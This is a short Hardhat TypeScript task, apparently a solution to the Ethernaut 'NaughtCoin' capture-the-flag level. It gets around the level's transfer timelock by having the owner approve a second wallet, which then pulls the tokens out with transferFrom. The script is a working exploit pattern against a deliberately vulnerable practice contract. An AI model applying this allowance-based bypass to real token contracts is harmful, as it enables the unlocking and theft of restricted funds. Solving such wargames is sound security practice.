import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { task } from "hardhat/config";

import { NaughtCoin, NaughtCoin__factory } from "../../typechain";

task("attack").setAction(async ({}, { ethers, network }) => {
  let factory: NaughtCoin__factory = (await ethers.getContractFactory("NaughtCoin")) as NaughtCoin__factory;
  let contract: NaughtCoin = factory.attach("<address of the contract>");

  let owner: SignerWithAddress;
  let anotherWallet: SignerWithAddress;
  [owner, anotherWallet] = await ethers.getSigners();
  await contract.approve(anotherWallet.address, ethers.utils.parseEther("1000000000000000"));

  await contract
    .connect(anotherWallet)
    .transferFrom(owner.address, anotherWallet.address, ethers.utils.parseEther("1000000"));
});
